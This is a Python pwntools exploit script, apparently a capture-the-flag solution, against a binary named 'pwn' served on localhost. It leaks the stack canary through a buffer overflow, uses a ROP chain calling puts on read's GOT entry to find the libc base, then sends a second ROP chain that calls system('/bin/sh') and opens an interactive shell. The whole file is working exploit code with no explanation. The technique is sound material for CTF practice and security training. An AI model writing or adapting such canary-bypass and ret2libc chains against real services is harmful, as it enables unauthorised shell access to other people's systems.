from pwn import *
import re, warnings

warnings.filterwarnings("ignore", category=BytesWarning)

# p = process('./pwn')
p = remote('localhost',33457)
elf = ELF('./pwn', checksec=False)
context(log_level='debug', arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
l64 = lambda: u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def get_canary():
    payload = 'a' * (0x50 - 0x8 - 4) + 'bbbb'  # 0x50: padding, 0x8: canary位置, 4: 'bbbb'
    p.sendlineafter('name?', payload)
    p.recvuntil(b"bbbb\n")
    ret = u64(b"\x00" + p.recv(7))
    print(p.recvuntil('stack!'))
    return ret


def leak_function():
    rop = ROP(elf)

    rop.raw(flat(72 * 'b', canary, 0xdeafbeef))
    puts_plt = elf.plt['puts']
    read = elf.got['read']
    rop.call(puts_plt, [read])
    rop.call('vuln')

    p.send(rop.chain())

    rec1 = p.recvuntil("\x7f")
    print('rec1: ' + ' '.join(f'{x:X}' for x in rec1))
    leak_addr = u64(rec1[-6:].ljust(8, b"\x00"))

    return leak_addr


canary = get_canary()
success('canary' + hex(canary))

leak_addr = leak_function()
success('leak_addr: ' + hex(leak_addr))

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
libc = ELF("libc6_2.31-0ubuntu9.9_amd64.so", checksec=False)
libc_base = leak_addr - libc.sym['read']
libc.address = libc_base
success('libc_base: ' + hex(libc_base))

system = libc.symbols['system']
bin_sh = libc.search(b'/bin/sh').__next__()

rop = ROP('./pwn')
rop.raw(flat(72 * 'a', canary, 0))
rop.call(system, [bin_sh,0])
payload = rop.chain()

p.sendafter('name', '111')
p.sendafter('stack!', payload)

p.interactive()
